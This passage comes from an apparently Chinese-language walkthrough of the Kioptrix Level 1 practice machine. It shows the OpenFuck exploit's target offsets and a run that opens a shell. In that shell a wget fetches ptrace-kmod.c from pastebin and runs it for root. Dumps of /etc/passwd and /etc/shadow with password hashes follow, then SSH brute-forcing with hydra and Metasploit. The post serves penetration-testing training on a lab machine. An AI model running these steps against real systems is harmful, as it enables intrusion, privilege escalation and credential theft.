FreeBSD 4.6.2-Release-p6 (apache-1.3.26)</span><br><span class="line">        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)</span><br><span class="line">        0x32 - FreeBSD (apache-1.3.27)</span><br><span class="line">        0x33 - Gentoo Linux (apache-1.3.24-r2)</span><br><span class="line">        0x34 - Linux Generic (apache-1.3.14)</span><br><span class="line">        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)</span><br><span class="line">        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)</span><br><span class="line">        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)</span><br><span class="line">        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)</span><br><span class="line">        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)</span><br><span class="line">        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line">        0x41 - Mandrake Linux 8.2 <span class="comment">#2 (apache-1.3.23-4)</span></span><br><span class="line">        0x42 - Mandrake Linux 8.2 (apache-1.3.24)</span><br><span class="line">        0x43 - Mandrake Linux 9 (apache-1.3.26)</span><br><span class="line">        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)</span><br><span class="line">        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)</span><br><span class="line">        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)</span><br><span class="line">        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)</span><br><span class="line">        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)</span><br><span class="line">        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)</span><br><span class="line">        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)</span><br><span class="line">        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)</span><br><span class="line">        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)</span><br><span class="line">        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)</span><br><span class="line">        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)</span><br><span class="line">        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1</span><br><span class="line">        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2</span><br><span class="line">        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)</span><br><span class="line">        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1</span><br><span class="line">        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2</span><br><span class="line">        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3</span><br><span class="line">        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1</span><br><span class="line">        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2</span><br><span class="line">        0x5b - Redhat Linux 7.x (apache-1.3.22)</span><br><span class="line">        0x5c - RedHat Linux 7.x (apache-1.3.26-1)</span><br><span class="line">        0x5d - RedHat Linux 7.x (apache-1.3.27)</span><br><span class="line">        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1</span><br><span class="line">        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2</span><br><span class="line">        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)</span><br><span class="line">        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)</span><br><span class="line">        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1</span><br><span class="line">        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2</span><br><span class="line">        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)</span><br><span class="line">        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)</span><br><span class="line">        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**</span><br><span class="line">        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)</span><br><span class="line">        0x6d - RedHat Linux 7.2 (apache-1.3.24)</span><br><span class="line">        0x6e - RedHat Linux 7.2 (apache-1.3.26)</span><br><span class="line">        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)</span><br><span class="line">        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1</span><br><span class="line">        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2</span><br><span class="line">        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)</span><br><span class="line">        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1</span><br><span class="line">        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2</span><br><span class="line">        0x75 - RedHat Linux 7.3 (apache-1.3.27)</span><br><span class="line">        0x76 - RedHat Linux 8.0 (apache-1.3.27)</span><br><span class="line">        0x77 - RedHat Linux 8.0-second (apache-1.3.27)</span><br><span class="line">        0x78 - RedHat Linux 8.0 (apache-2.0.40)</span><br><span class="line">        0x79 - Slackware Linux 4.0 (apache-1.3.6)</span><br><span class="line">        0x7a - Slackware Linux 7.0 (apache-1.3.9)</span><br><span class="line">        0x7b - Slackware Linux 7.0 (apache-1.3.26)</span><br><span class="line">        0x7c - Slackware 7.0  (apache-1.3.26)2</span><br><span class="line">        0x7d - Slackware Linux 7.1 (apache-1.3.12)</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x7f - Slackware Linux 8.1 (apache-1.3.24)</span><br><span class="line">        0x80 - Slackware Linux 8.1 (apache-1.3.26)</span><br><span class="line">        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)</span><br><span class="line">        0x82 - Slackware Linux (apache-1.3.27)</span><br><span class="line">        0x83 - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">        0x84 - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">        0x85 - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">        0x87 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)</span><br><span class="line">        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)</span><br><span class="line"></span><br><span class="line">Fuck to all guys <span class="built_in">who</span> like use lamah ddos. Read SRC to have no surprise</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到了符合版本可以進行利用的offset</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck 0x6b 192.168.19.140 -c 40     </span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">race-kmod.c; gcc -o p ptrace-kmod.c; <span class="built_in">rm</span> ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt </span><br><span class="line">--04:46:23--  https://pastebin.com/raw/C7v25Xr9</span><br><span class="line">           =&gt; `ptrace-kmod.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to pastebin.com:443... connected!</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0K ...                                                    @   3.84 MB/s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">04:46:24 (3.84 MB/s) - `ptrace-kmod.c&#x27;</span> saved [4026]</span><br><span class="line"></span><br><span class="line">ptrace-kmod.c:183:1: warning: no newline at end of file</span><br><span class="line">[+] Attached to 6630</span><br><span class="line">[+] Waiting <span class="keyword">for</span> signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now <span class="built_in">wait</span> <span class="keyword">for</span> suid shell...</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"></span><br><span class="line">locate flag</span><br><span class="line">/usr/sbin/rootflags</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/tgetflag.3x.gz</span><br><span class="line">/usr/share/man/man3/tigetflag.3x.gz</span><br><span class="line">/usr/share/man/man8/rootflags.8.gz</span><br><span class="line">/usr/include/bits/waitflags.h</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/rootflags</span><br><span class="line">ELhP�A�q��.u�V����������P�s������jatus)Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/var/spool/news:</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">mailnull:x:47:47::/var/spool/mqueue:/dev/null</span><br><span class="line">rpm:x:37:37::/var/lib/rpm:/bin/bash</span><br><span class="line">xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:/:/bin/false</span><br><span class="line">rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nscd:x:28:28:NSCD Daemon:/:/bin/false</span><br><span class="line">ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd</span><br><span class="line">ogin</span><br><span class="line">radvd:x:75:75:radvd user:/:/bin/false</span><br><span class="line">postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/var/www:/bin/false</span><br><span class="line">squid:x:23:23::/var/spool/squid:/dev/null</span><br><span class="line">pcap:x:77:77::/var/arpwatch:/bin/nologin</span><br><span class="line">john:x:500:500::/home/john:/bin/bash</span><br><span class="line">harold:x:501:501::/home/harold:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$1$XROmcfDX<span class="variable">$tF93GqnLHOJeGRHpaNyIs0</span>:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1<span class="variable">$zL4</span>.MR4t<span class="variable">$26N4YpTGceBO0gTX6TAky1</span>:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd<span class="variable">$IMOGACl3r757dv17LZ9010</span>:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通過root身分可以看到不少機敏資訊</li>
+</ul>
+<h3 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a><strong>Brute Force Attacks</strong></h3><p>從現實角度出發</p>
+<ul>
+<li><p>評估中看到SSH，嘗試對其進行暴力破解，或默認憑據</p>
+<ul>
+<li>測試密碼強度</li>
+<li>弱密碼、默認密碼</li>
+</ul>
+</li>
+<li><p>確認藍隊的表現</p>
+<ul>
+<li>評估對方是否能偵測到攻擊</li>
+<li>攻擊是否有告警</li>
+</ul>
+</li>
+<li><p>hydra - SSH 錯誤</p>
+  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  enter &gt; 選SSH client &gt; OK</p>
+<p>  <img src="/img/exploit_Untitled_4.png" alt="Untitled"></p>
+<p>  會需要再輸入一次</p>
+<p>  <img src="/img/exploit_Untitled_5.png" alt="Untitled"></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>
+
+<p>同時開啟MSF，選擇需要的模塊並將選項中的參數填入，執行程式</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; **search ssh**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution</span><br><span class="line">   2   auxiliary/scanner/ssh/karaf_login                                                  normal     No     Apache Karaf Login Utility</span><br><span class="line">   3   exploit/apple_ios/ssh/cydia_default_ssh                           2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability                                                                                                    </span><br><span class="line">   4   exploit/unix/ssh/arista_tacplus_shell                             2020-02-02       great      Yes    Arista restricted shell escape (with privesc)</span><br><span class="line">   5   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution</span><br><span class="line">   6   exploit/linux/ssh/ceragon_fibeair_known_privkey                   2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure</span><br><span class="line">   7   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration</span><br><span class="line">....</span><br><span class="line">   43  exploit/linux/ssh/quantum_dxi_known_privkey                       2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure                                                                                                      </span><br><span class="line">   44  exploit/linux/ssh/quantum_vmpro_backdoor                          2014-03-17       excellent  No     Quantum vmPRO Backdoor Command</span><br><span class="line">   45  auxiliary/fuzzers/ssh/ssh_version_15                                               normal     No     SSH 1.5 Version Fuzzer</span><br><span class="line">   46  auxiliary/fuzzers/ssh/ssh_version_2                                                normal     No     SSH 2.0 Version Fuzzer</span><br><span class="line">   47  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                          normal     No     SSH Key Exchange Init Corruption</span><br><span class="line">   48  post/linux/manage/sshkey_persistence                                               excellent  No     SSH Key Persistence</span><br><span class="line">   49  post/windows/manage/sshkey_persistence                                             good       No     SSH Key Persistence</span><br><span class="line">   **50  auxiliary/scanner/ssh/ssh_login                                                    normal     No     SSH Login Check Scanner**</span><br><span class="line">   51  auxiliary/scanner/ssh/ssh_identify_pubkeys                                         normal     No     SSH Public Key Acceptance Scanner</span><br><span class="line">   52  auxiliary/scanner/ssh/ssh_login_pubkey                                             normal     No     SSH Public Key Login Scanner</span><br><span class="line">   53  exploit/multi/ssh/sshexec                                         1999-01-01       manual     No     SSH User Code Execution</span><br><span class="line">   54  auxiliary/scanner/ssh/ssh_enumusers                                                normal     No     SSH Username Enumeration</span><br><span class="line">   55  auxiliary/fuzzers/ssh/ssh_version_corrupt                                          normal     No     SSH Version Corruption</span><br><span class="line">   56  auxiliary/scanner/ssh/ssh_version                                                  normal     No     SSH Version Scanner</span><br><span class="line">.....</span><br><span class="line">   70  payload/cmd/unix/bind_aws_instance_connect                                         normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)</span><br><span class="line">   71  exploit/linux/ssh/vmware_vrni_known_privkey                       2023-08-29       excellent  No     VMWare Aria Operations <span class="keyword">for</span> Networks (vRealize Network Insight) SSH Private Key Exposure</span><br><span class="line">   72  exploit/linux/ssh/vmware_vdp_known_privkey                        2016-12-20       excellent  No     VMware VDP Known SSH Key                                                                                                                        </span><br><span class="line">   73  exploit/multi/http/vmware_vcenter_uploadova_rce                   2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE</span><br><span class="line">   74  exploit/linux/ssh/vyos_restricted_shell_privesc                   2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation</span><br><span class="line">   75  post/windows/gather/credentials/whatsupgold_credential_dump       2022-11-22       manual     No     WhatsUp Gold Credentials Dump</span><br><span class="line">   76  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction</span><br><span class="line">   77  exploit/windows/local/unquoted_service_path                       2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation</span><br><span class="line">   78  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                       2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm</span><br><span class="line">   79  auxiliary/scanner/ssh/libssh_auth_bypass                          2018-10-16       normal     No     libssh Authentication Bypass Scanner</span><br><span class="line">   80  exploit/linux/http/php_imap_open_rce                              2018-10-23       good       Yes    php imap_open Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 80, use 80 or use exploit/linux/http/php_imap_open_rce</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 50</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>            <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="keyword">in</span> the current database (Accepted: none, us</span><br><span class="line">                                                er, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   RHOSTS                             <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba</span><br><span class="line">                                                sics/using-metasploit.html</span><br><span class="line">   RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.19.140</span><br><span class="line">rhosts =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                    Required  Description</span><br><span class="line">   ----              ---------------                    --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>                              <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                              no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                                  <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                              no        Try each user/password couple stored <span class="keyword">in</span> the current databa</span><br><span class="line">                                                                  se</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                              no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                               no        Skip existing credentials stored <span class="keyword">in</span> the current database (</span><br><span class="line">                                                                  Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                                             no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/wordlists/metasploit/u  no        File containing passwords, one per line</span><br><span class="line">                     nix_passwords.txt</span><br><span class="line">   RHOSTS            192.168.19.140                     <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/u</span><br><span class="line">                                                                 